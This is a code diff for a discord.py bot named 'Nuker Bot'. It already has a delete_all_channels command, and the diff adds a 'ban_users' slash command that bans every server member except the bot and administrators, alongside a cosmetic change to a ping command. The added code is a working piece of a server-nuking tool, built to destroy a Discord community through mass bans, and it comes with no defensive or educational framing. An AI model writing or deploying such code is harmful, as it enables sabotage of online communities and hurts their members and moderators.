@@ -40,8 +40,8 @@ async def echo(interaction: discord.Interaction, message: str) -> None:
 )
 async def ping(interaction: discord.Interaction) -> None:
     await interaction.response.send_message(
-f"""🏓 Pong!
-{bot.latency*1000:.0f}ms"""
+        f"""🏓 Pong!
+{bot.latency * 1000:.0f}ms"""
     )
 
 
@@ -64,6 +64,23 @@ async def delete_all_channels(interaction: discord.Interaction) -> None:
     await interaction.response.send_message(str([
         channel.name for channel in real_channels
     ]))
+
+
+@bot.tree.command(
+    name="ban_users",
+    description="Ban all users in the server",
+    guild=testGuild
+)
+@commands.has_permissions(ban_members=True)
+async def ban_users(interaction: discord.Interaction) -> None:
+    print(interaction.app_permissions)
+    for user in interaction.guild.members:
+        if str(user) == "Nuker Bot#2899" or user.guild_permissions.administrator:
+            continue
+
+        await user.ban()
+
+    await interaction.response.send_message("💥", ephemeral=True)
 
 
 bot.run(BOT_TOKEN)
